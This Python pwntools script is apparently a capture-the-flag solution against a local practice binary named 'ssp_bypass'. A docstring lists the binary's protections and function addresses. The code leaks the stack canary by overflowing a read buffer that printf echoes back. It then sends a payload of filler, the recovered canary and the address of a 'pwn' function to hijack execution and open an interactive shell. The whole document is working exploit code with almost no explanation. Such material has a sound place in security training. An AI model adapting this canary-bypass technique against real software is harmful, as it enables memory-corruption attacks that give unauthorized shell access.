#!/usr/bin/env python

"""

Canary                        : Yes
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : No

0x08049000  _init
0x08049030  setbuf@plt
0x08049040  read@plt
0x08049050  printf@plt
0x08049060  __stack_chk_fail@plt
0x08049070  puts@plt
0x08049080  system@plt
0x08049090  __libc_start_main@plt
0x080490a0  setuid@plt
0x080490b0  _start
0x080490f0  _dl_relocate_static_pie
0x08049100  __x86.get_pc_thunk.bx
0x08049110  deregister_tm_clones
0x08049150  register_tm_clones
0x08049190  __do_global_dtors_aux
0x080491c0  frame_dummy
0x080491c2  pwn
0x08049215  begin
0x0804928b  FaiCose
0x080492f7  main
0x08049360  __libc_csu_init
0x080493c0  __libc_csu_fini
0x080493c1  __x86.get_pc_thunk.bp
0x080493d0  __stack_chk_fail_local
0x080493e4  _fini



"""


from pwn import *

junk = "A" * 100 # send newline too, so printf will continue
                 # to get chars to print and will print
                 # the canary cookie value!

p = process("./ssp_bypass")

# First stage: canary stack leakage

p.recv()
p.sendline(junk)

p.recvuntil(junk)

leaked_cookie = u32(p.recv(4))
cookie = leaked_cookie - 0xa

log.info("leaked cookie: {}".format(hex(leaked_cookie)))
log.success("cookie: {}".format(hex(cookie)))

# Second stage: calling pwn() to get shell

pwnfu = p32(0x080491c2)
cookie = p32(cookie)
payload = junk + cookie + ("B" * 12) + pwnfu
 

p.recv()
p.sendline(payload)
p.clean()


p.interactive()
